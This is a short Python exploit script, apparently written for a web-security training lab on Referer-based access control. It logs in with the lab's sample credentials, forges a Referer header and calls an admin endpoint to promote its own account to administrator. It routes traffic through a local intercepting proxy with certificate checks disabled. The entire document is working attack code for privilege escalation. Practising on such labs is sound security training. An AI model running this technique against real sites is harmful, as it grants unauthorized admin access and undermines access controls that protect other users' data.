import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

# Referer-based access control
def upgrade(session,url):
    # login to wiener acount
    url_log=url+"/login"
    data={"username":"wiener","password":"peter"}
    
    response=session.post(url_log,data=data,verify=False)
    response=response.text
    if "Log out" in response:
        print("(+) Log in syccessfully .")
        url_up=url+"/admin-roles?username=wiener&action=upgrade"
        headers={"Referer": url+ "/admin"}
        response_up=session.get(url_up,headers=headers,verify=False,proxies=proxies)
        if response_up.status_code == 200:
            print('(+) Upgrdae done successfully .')
        else:
            print('(-) Error while trying to upgrade')
            print(response_up)
    else:
        print('(-) Error while trying to Login .')


def Main():
    if len(sys.argv) != 2 :
        
        print("(+) Usag]e %s <url>"%sys.argv[0])
        print('(+) Example : %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    url=sys.argv[1]
    session=requests.session()

    upgrade(session,url)


if __name__ == "__main__":
    Main()